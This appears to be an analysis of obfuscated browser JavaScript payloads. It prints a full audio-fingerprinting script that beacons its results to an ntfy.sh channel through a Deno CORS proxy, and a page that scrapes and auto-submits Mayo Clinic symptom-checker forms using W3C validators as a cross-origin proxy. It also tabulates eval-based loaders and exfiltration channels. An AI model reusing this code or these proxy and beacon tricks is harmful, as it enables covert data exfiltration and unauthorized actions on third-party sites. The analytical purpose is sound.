Pseudocode reconstruction of the 42 obfuscated code fragments, it parses a zip file in chunks looking for 'Garner' and 'All My Loves'.

Zeno.do / MIDI fetch (June 4):
```js
U='https://zenodo.org/api/records/8354955'
Z=fetch(U+'/files/midi_hawthorne.zip/content')
```

```js
d.a07='JytLbN0YXR1cyk7bGV0IGM9ci5oZWFkZXJzLmdldCgnZ2...'
```

This fetches a **MIDI file** (`midi_hawthorne.zip`) from Zenodo (a research data repository) and processes it — likely another audio-analysis payload, related to the `Sr1` fingerprinting.

So `https://zenodo.org/api/records/8354955/files/midi_hawthorne.zip/content` is fetched in chunks. This is the zip the program above parses.

This zip does indeed contain `midi_hawthorne.zip\midi\studio\Erroll Garner\Afternoon Of An Elf\All My Loves Are You.midi`. 

Summary:


| Stage                | Mechanism                                                                                 | Purpose                                                     |
| -------------------- | ----------------------------------------------------------------------------------------- | ----------------------------------------------------------- |
| **Staging**          | `pie.dev/base64/<b64>`                                                                    | Hosts arbitrary HTML/JS by abusing httpbin's base64 decoder |
| **Bootstrap**        | `setInterval(()=>eval(atob(J())), N)`                                                     | Persistently re-evals a reassembled payload                 |
| **Payload assembly** | `d.a01`…`d.a42` + `J()`                                                                   | Splits base64 script into fragments, reassembles at runtime |
| **Loader**           | `w=s=>document.write('<script src=//da.gd/'+s+'>')`                                       | Loads numbered chunks from `da.gd`                          |
| **C2 / exfil**       | `ntfy.sh/garner-*`, `validator.nu`, `allorigins`, Deno proxies                            | Fetch remote code, send status/errors/data                  |
| **Exfil channels**   | `new Image().src=...`, `fetch('/anything/...')`, ntfy POST                                | No-CORS data exfiltration                                   |
| **Capabilities**     | Audio fingerprinting (Goertzel), DOCX text theft, Mayo Clinic form-jacking, MIDI analysis | Content extraction, site automation, audio identification   |
| **Error reporting**  | `window.onerror` → ntfy                                                                   | Debugging / liveness                                        |
|                      |                                                                                           |                                                             |

### Others

The one from 2026-06-26 12:07:35:

```js
(async()=>{
  var q='https://ntfy.sh/garner-res-8842/publish?message=',
  S=m=>(new Image).src=q+encodeURIComponent(m).slice(0,1900);
  S('S0');
  try{
    var R=await fetch('https://tb-cors-proxy.deno.dev/https://cs1.mp3.pm/listen/200604260/YU5oSmNENWxteVNaY3lJZk15TEJLamhlNTNhNFdiaFh6bnpLbi9vS1c0Y3FPREViQkxBbGoxaGlMTUgwQldMeVlHcDZtUm00Wkp...'),
    D=R.body.getReader(),C=[],g=0;
    while(g<19e5){var r=await D.read();if(r.done)break;C.push(r.value);g+=r.value.length}
    S('S1 '+g);
    var A=await new OfflineAudioContext(1,9,44100).decodeAudioData(await new Blob(C).arrayBuffer()),
    F=A.sampleRate,d=A.getChannelData(0);
    S('S2 '+A.duration.toFixed(1)+' '+F);
    var N=~~(.12*F),H=~~(.04*F),W=[],M=[],O=[];
    for(var n=0;n<N;n++)W[n]=.5-.5*Math.cos(6.2832*n/N);
    for(var k=48;k<97;k++){M.push(k);O.push(2*Math.cos(6.2832*440*Math.pow(2,(k-69)/12)/F))}
    var out=[],b=0;
    for(var t=~~(34*F);t<N;t+=H){
      var a=[],x=[],n,k,c,s0,s1,s2;
      for(n=0;n<N;n++)x[n]=d[t+n]*W[n];
      for(k=0;k<M.length;k++){
        c=O[k];s1=s2=0;
        for(n=0;n<N;n++){s0=x[n]+c*s1-s2;s2=s1;s1=s0}
        a.push(s1*s1+s2*s2-c*s1*s2)
      }
      var ix=a.map((v,i)=>i).sort((p,w)=>a[w]-a[p]).slice(0,5);
      out.push(ix.map(i=>M[i]).join('.')+'~'+Math.round(10*Math.log10(a[ix[0]]+1e-9)));
      if(out.length>=90){S('RA'+b+' '+out.join(';'));b++;out=[]}
    }
    if(out.length)S('RA'+b+' '+out.join(';'));
    S('S9')
  }catch(e){S('SE '+e.message)}
})()
```

This is a **Goertzel-algorithm pitch detector / audio fingerprinting tool**:

- Downloads an MP3 from `cs1.mp3.pm` via the Deno CORS proxy.
- Decodes it with `OfflineAudioContext`.
- Applies a Hann window of ~120 ms, hops every ~40 ms.
- Runs a Goertzel filter bank over MIDI notes 48–96 (C3–C7), computing energy at each semitone.
- For each frame, picks the top-5 strongest pitches and emits a compact fingerprint string like `48.55.60.64.67~-12;...`.
- Exfiltrates the fingerprint to ntfy.

This is a **Shazam-style audio fingerprinting** implementation, presumably to identify or characterize audio content the agent encountered.

Two payloads (2026-07-11 16:34 and 16:17) decode to full HTML pages that scrape and auto-submit Mayo Clinic symptom-checker forms:

```html
<!doctype html><html><body><p>c</p><script>
var P="https://www.mayoclinic.org/symptom-checker/shortness-of-breath-in-adults-adult/related-factors/itt-20009075",
W=["Ongoing or recurrent","Dry cough"],
E=encodeURIComponent;
var x=new XMLHttpRequest();
x.open('GET','https://validator.nu/?showsource=yes&doc='+E('https://validator.w3.org/nu/?showsource=yes&doc='+E(P)),false);
x.send();
function q(h){return (new DOMParser).parseFromString(h,'text/html')}
var d=q(q(q(x.responseText).querySelector('ol.source').textContent).querySelector('ol.source').textContent);
var f=document.createElement('form');f.method='post';f.action=P;
function z(n,v){var i=document.createElement('input');i.type='hidden';i.name=n;i.value=v;f.appendChild(i)}
['__VIEWSTATE','__VIEWSTATEGENERATOR','__EVENTVALIDATION'].forEach(function(k){var e=d.getElementById(k);e&&z(k,e.value)});
var G=[],L=d.getElementsByTagName('label');
for(var i=0;i<L.length;i++){
  if(W.indexOf(L[i].textContent.trim())>=0){
    var c=d.getElementById(L[i].htmlFor);
    c&&(z(c.name,'on'),G.push(c.getAttribute('SitecoreID')))
  }
}
z('main_0$maincontent_1$FindCause','Find causes');
z('main_0$maincontent_1$FactorGuidsHiddenField','|'+G.join('|'));
document.body.appendChild(f);
G.length==W.length&&f.submit();
</script></body></html>
```

What this does

1. **Fetches the Mayo Clinic symptom-checker page indirectly** via `validator.nu` and `validator.w3.org/nu/` — using the W3C validator as a CORS proxy / HTML source viewer. The double-nesting (`validator.nu` fetching `validator.w3.org` fetching Mayo) is a **CORS-bypass / SSRF trick**.
2. **Parses the returned HTML** with `DOMParser`, extracting the `ol.source` contents (twice, because the validator wraps the source).
3. **Extracts [ASP.NET](https://asp.net/) hidden fields** (`__VIEWSTATE`, `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION`) and all `<label>` elements.
4. **Selects checkboxes** whose label text matches `W` (e.g. "Dry cough", "Ongoing or recurrent").
5. **Builds a form** posting to the Mayo Clinic endpoint with the hidden fields plus the selected factor GUIDs, and the `FindCause` button.
6. **Auto-submits** the form, effectively running a symptom-checker query as the victim — likely to enumerate results or to perform a CSRF-style interaction with Mayo's site.


This is a **browser-automation / form-jacking** payload targeting a medical site, using W3C validators as a proxy to read cross-origin HTML.

